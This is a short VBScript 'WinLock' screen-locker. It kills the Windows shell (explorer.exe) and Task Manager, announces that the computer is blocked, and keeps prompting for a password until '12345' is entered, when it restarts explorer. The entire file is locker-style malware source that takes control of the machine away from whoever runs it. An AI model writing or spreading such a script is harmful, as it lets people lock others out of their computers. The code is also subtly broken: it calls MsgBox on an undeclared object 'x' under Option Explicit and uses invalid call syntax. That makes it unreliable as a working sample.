Option Explicit

Dim objShell, password

Set objShell = CreateObject("WScript.Shell")

objShell.Run "taskkill /f /im explorer.exe"
objShell.Run "taskkill /f /im taskmgr.exe"

x.MsgBox ("Your Windows was blocked", 48, "WinLock")

Do
    password = InputBox("Enter password")

    If password = "12345" Then
        objShell.Run "explorer.exe"
		x.MsgBox ("...", 64, "WinLock")
        Exit Do
    Else
        x.MsgBox ("Incorrect password. Try again", 16, "WinLock")
    End If
Loop